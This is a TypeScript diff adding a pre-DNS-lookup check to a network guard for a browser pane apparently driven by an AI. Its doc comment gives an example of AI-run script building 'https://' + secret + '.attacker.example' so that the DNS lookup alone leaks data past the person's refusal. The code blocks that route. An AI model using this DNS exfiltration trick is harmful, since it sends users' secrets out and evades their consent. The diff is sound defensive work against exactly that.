@@ -42,6 +42,35 @@ export function publicRequestVerdict(r: PublicRequest): PublicVerdict {
   return r.scripted && !r.sameSiteAsTop ? 'block' : 'allow'
 }
 
+/**
+ * Decided before any DNS lookup (security review 2026-10-30 "N3"; docs/DECISIONS.md "Outbound web channels"). A host
+ * name can carry data to its DNS server: script the AI ran can build 'https://' + secret + '.attacker.example' (the
+ * team server's address check reads only addresses written out in the code), and the lookup alone delivers it, before
+ * any block and even when the person says no. So, for a name that needs DNS:
+ *  - 'cancel': a request the guard refuses whatever the name resolves to: a sub-request of a document the AI scripted
+ *    (or of a requester without a tab while a scripted document is open) to another site the person has not allowed,
+ *    neither as a site nor as an office address, from a page that is not an allowed office page
+ *  - 'ask': a page load the person must allow anyway (the AI drives the pane, or a scripted document is open) to a
+ *    name not allowed yet: the site card comes before the lookup; an office address then asks its own card too
+ *  - 'lookup': decided by the address class as before (publicRequestVerdict, the office rules in net-guard.ts)
+ * IP literals and local names need no lookup and keep the rules as they were.
+ */
+export interface BeforeLookup extends PublicRequest {
+  /** the name goes through DNS (classify.ts isDnsName) */
+  needsDns: boolean
+  /** the person allowed the target as an office-network address (or typed it) */
+  officeAllowed: boolean
+  /** the tab's page is an address the person allowed as an office address (its office resources may load) */
+  topOfficeAllowed: boolean
+}
+
+export function beforeLookupVerdict(r: BeforeLookup): 'cancel' | 'ask' | 'lookup' {
+  if (!r.needsDns || r.siteAllowed || r.officeAllowed) return 'lookup'
+  if (!r.hasOwner) return r.anyScripted ? 'cancel' : 'lookup'
+  if (r.mainFrame) return r.driving || r.anyScripted || r.scripted ? 'ask' : 'lookup'
+  return r.scripted && !r.sameSiteAsTop && !r.topOfficeAllowed ? 'cancel' : 'lookup'
+}
+
 /** Browser tools that run the AI's own code in the page: never on a blank tab (no site the person could allow). */
 export const RUNS_AI_SCRIPT: ReadonlySet<string> = new Set(['javascript_tool'])
 
